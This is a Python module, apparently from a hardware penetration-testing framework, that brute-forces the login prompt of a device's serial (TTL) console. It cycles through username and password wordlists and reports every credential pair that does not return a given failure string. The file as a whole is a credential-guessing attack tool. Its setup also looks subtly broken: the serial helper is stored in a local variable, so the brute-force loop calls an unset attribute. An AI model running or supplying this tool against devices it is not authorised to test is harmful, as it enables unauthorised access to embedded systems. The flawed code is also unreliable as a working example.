from core.ISFFramework import ISFContainer, submodule, Param
import serial,time
from modules.hardware.TTLTalker import TTLer

@ISFContainer(version="1.0",
           author="Not_so_sm4rt_hom3 team")
class BruteForce:
    in_params = {
        "Device": Param("Path to device. Example: COM14", required=False, default_value='/dev/tty.usbserial-00000000'),
        "Baudrate": Param("Digital baudrate for serial connection", value_type=int, required=False, default_value=115200),
        "Timeout": Param("Timeout between requests",required=False, default_value=1, value_type=float),
        "Debug": Param("Use verbose output", required=False, value_type=bool, default_value=False)
    }

    out_params = {
        "TEST": Param("Test out parameter")
    }

    baudrate = 115200
    device_path = ''
    connected = 0
    timeout = 0.1
    TTLTalker_obj = ''
    debug = False
    readyConsole = False

    def __init__(self, in_params):
        self.device_path = in_params['Device']
        self.baudrate = in_params['Baudrate']
        self.timeout = in_params['Timeout']
        self.debug = in_params['Debug']
        TTLTalker_obj = self.get_module_instance('hardware/TTLTalker/sendRawCMDTTL',in_params)

    def __del__(self):
        if self.connected:
            self.ser.close()

    def first_connect(self):
        self.connected = 1


    @submodule(name="logpassTTLbruter",
               description="Bruteforce TTL auth form",
               in_params={
                   "UsersPath": Param("Path to users wordlist", required=False, default_value='', value_type=str),
                   "Username": Param("Target username", required=False, default_value='admin', value_type=str),
                   "PassPath": Param("Path to pass wordlist", required=True, default_value='', value_type=str),
                   "WrongStr": Param("Wrong password substring", required=True, default_value='', value_type=str),
                   "StringSplitter": Param("Splitting commands in hex, default: 0a", required=False, default_value='0a', value_type=str)
               },
               out_params={"Amount": Param("Amount of found accounts", value_type=int)})
    def bruteForcer(self,params):

        usernames = []
        splitter = bytes.fromhex(params['StringSplitter']).decode('utf-8')
        if params['UsersPath'] == '':
            usernames.append(params['Username'])
        else:
            f = open(params['UsersPath'])
            s = f.read()
            f.close()
            usernames = s.split('\n')

        f = open(params['PassPath'])
        s = f.read()
        f.close()
        passwords = s.split('\n')
        amount = 0

        for user in usernames:
            for password in passwords:
                auth_login = self.TTLTalker_obj({'message': user+splitter})['response']
                pass_login = self.TTLTalker_obj({'message':password+splitter})['response']
                if not params["WrongStr"] in pass_login:
                    print('Login "{}" and password "{}" are correct!'.format(user,password))
                    amount += 1
        return {'Amount': amount}


